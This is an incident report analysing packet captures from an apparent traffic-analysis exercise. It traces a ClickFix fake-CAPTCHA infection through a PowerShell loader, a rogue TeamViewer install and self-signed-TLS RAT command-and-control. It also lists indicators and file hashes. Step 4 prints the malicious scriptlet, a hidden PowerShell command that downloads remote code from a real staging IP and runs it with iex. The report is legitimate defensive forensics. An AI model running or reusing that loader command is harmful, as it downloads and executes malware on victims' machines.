# Incident Report — PCAP Forensic Analysis
**Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 frames, ~3202s / ~53 min capture)
**No IDS/Suricata alert exports were present in the evidence directory.** All findings below are derived directly from packet analysis.

## Victim Host

| Field | Value |
|---|---|
| IPv4 | **10.1.17.215** |
| MAC address | **00:d0:b7:26:4a:74** |
| Windows hostname | **DESKTOP-L8C5GSJ** |
| Windows domain | BLUEMOONTUESDAY |
| Logged-in user | **shutchenson** |

Confirmed via ARP (IP↔MAC binding), DHCP option 12 (hostname DESKTOP-L8C5GSJ tied to MAC 00:d0:b7:26:4a:74), NBNS (workstation name DESKTOP-L8C5GSJ / domain BLUEMOONTUESDAY on 10.1.17.215), and Kerberos CNameString (`shutchenson`, `desktop-l8c5gsj$`) authenticating from 10.1.17.215. LAN gateway is 10.1.17.2 (MAC 00:24:e8:7f:09:5d).

## Infection Chain (chronological, by capture-relative time)

1. **t=38.3s** — victim browses to `google-authenticator.burleson-appliance.net` (TLS SNI, resolved 104.21.64.1) — a fake "Google Authenticator" verification lure.
2. **t=39.6s** — victim proceeds to `authenticatoor.org` (82.221.136.26) — the fake CAPTCHA / "verify you are human" page. This is the classic **ClickFix** social-engineering pattern: the page instructs the user to paste and run a command via the Windows Run dialog.
3. **t=52.7s** — `appointedtimeagriculture.com` (217.70.186.109) contacted, part of the same lure/redirect infrastructure.
4. **t=60.3s** — victim (via the pasted clipboard command, executed as `mshta`/`regsvr32`-style scriptlet) fetches `http://5.252.153.241/api/file/get-file/264872` with UA `Mozilla/4.0 (compatible; MSIE 7.0; ...)` — this is a WinHTTP/default-client UA typical of a script loader, not a real browser.
   - Object `264872` is a VBScript **`.sct` scriptlet**, content:
     ```
     objShell.Run("cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command
       ""start-process 'https://azure.microsoft.com';
       iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1');
       #URL: https://teams.microsoft.com""")
     ```
     It opens decoy tabs (azure.microsoft.com / teams.microsoft.com) while silently launching hidden PowerShell.
   - SHA256: `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103`
5. **t=62.1s** — PowerShell downloads `http://5.252.153.241/api/file/get-file/29842.ps1`, a base64/`iex`-obfuscated PowerShell loader.
   - SHA256: `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded`
   - A near-identical second-stage script `pas.ps1` (SHA256 `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e`) is also pulled from the same host.
6. **t=62.4s onward** — the infected host begins beaconing every ~5 seconds to `http://5.252.153.241/1517096937`, reporting status via query string, e.g.:
   - `?k=message = startup shortcut created; status = success;`
   - `?k=script: RunRH, status: OK, message: PS process started`
   These confirm persistence installation (a startup-folder shortcut) and remote script execution logging back to the C2/staging server.
7. **t≈125–129s** — the malware pulls down a bundled **TeamViewer QuickSupport payload** from the same staging host: `/api/file/get-file/TV`, `/api/file/get-file/TeamViewer`, `/api/file/get-file/Teamviewer_Resource_fr` — installing a rogue, attacker-controlled TeamViewer instance for hands-on-keyboard remote access. This instance subsequently connects to legitimate TeamViewer infrastructure (`master16.teamviewer.com`, 185.188.32.26 — benign infrastructure being abused, not itself malicious) via `din.aspx`/`dout.aspx` DynGate check-ins beginning ~t=611s.
8. **Ongoing (~t=889s onward)** — the host establishes a persistent, high-volume TCP session to **45.125.66.32:2917**, negotiating **TLS with a self-signed certificate** (`CN=45.125.66.32, O=N/A, "Self-signed certificate"`, validity 2025‑01‑22→2027‑01‑22). This is the primary command-and-control channel: an unusual, non-standard port, no legitimate hostname/SNI, self-signed cert — classic remote-access-trojan C2 fingerprint. This session (stream carries ~10,000 frames / ~10 MB) runs for most of the remaining capture and continues to at least t=2610s.
9. **t≈917s onward** — a secondary/backup channel to **45.125.66.252** on TCP/2917 with the same self-signed-cert pattern is also observed.
10. Beaconing to 5.252.153.241 (staging/status server) continues intermittently through **t=3202s** (end of capture).

## Malware Family

Behavioral attribution — **not signature-confirmed** (no IDS/Suricata alerts were provided with this evidence). The observed chain — ClickFix fake-CAPTCHA lure → hidden PowerShell → `.sct`/PowerShell staged loader from a bare-IP "get-file" API → startup-shortcut persistence → silent TeamViewer deployment for hands-on access → a custom-port, self-signed-TLS RAT C2 channel — is consistent with the **SecTopRAT (Arechclient2)** family, which is documented to combine a .NET RAT/stealer with a bundled rogue TeamViewer component for interactive remote access, delivered via ClickFix-style fake verification pages. Treat the family name as a working hypothesis pending signature or sample-level confirmation; the delivery/behavior pattern itself (ClickFix → PowerShell loader → RAT with self-signed TLS on a non-standard port + TeamViewer sideload) is confirmed directly from traffic.

## Indicators of Compromise

**C2 endpoints (grounded in traffic):**
- `45.125.66.32:2917` — TCP, self-signed TLS, primary RAT C2 (majority of post-infection traffic)
- `45.125.66.252:2917` — TCP, self-signed TLS, secondary/backup C2
- `5.252.153.241:80` (HTTP, bare-IP host header) — payload staging/loader server and status-beacon endpoint

**Malicious/lure domains:**
- `authenticatoor.org` (→ 82.221.136.26) — fake CAPTCHA/ClickFix lure page
- `google-authenticator.burleson-appliance.net` (→ 104.21.64.1) — fake Google Authenticator lure
- `appointedtimeagriculture.com` (→ 217.70.186.109) — redirect/lure infrastructure

**Malicious URLs:**
- `http://5.252.153.241/api/file/get-file/264872` — initial `.sct` scriptlet
- `http://5.252.153.241/api/file/get-file/29842.ps1` — stage-2 PowerShell loader
- `http://5.252.153.241/api/file/get-file/pas.ps1` — stage-2 PowerShell loader variant
- `http://5.252.153.241/api/file/get-file/TV`, `/TeamViewer`, `/Teamviewer_Resource_fr` — rogue TeamViewer components
- `http://5.252.153.241/1517096937?k=...` — beacon/status check-in (repeated)

**Transferred files and SHA256 hashes:**
| File | SHA256 |
|---|---|
| 264872 (VBScript `.sct` loader) | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103` |
| 29842.ps1 (PowerShell loader) | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` |
| pas.ps1 (PowerShell loader) | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` |
| TV (PE32 DLL) | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` |
| TeamViewer (PE32 GUI EXE) | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` |
| Teamviewer_Resource_fr | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` |

**Benign context (not indicators):** Windows Defender delta-patch `.cab`/`.exe` files and `connecttest.txt` via Microsoft/Akamai delivery infrastructure; legitimate TeamViewer master server 185.188.32.26 (`master16.teamviewer.com`) — abused as transport by the rogue TeamViewer install, not itself malicious infrastructure; all MSN/Bing/Office/ad-tech/CDN traffic (Akamai, Adobe, LivePerson, Yahoo, LinkedIn, etc.) is normal endpoint/background telemetry.
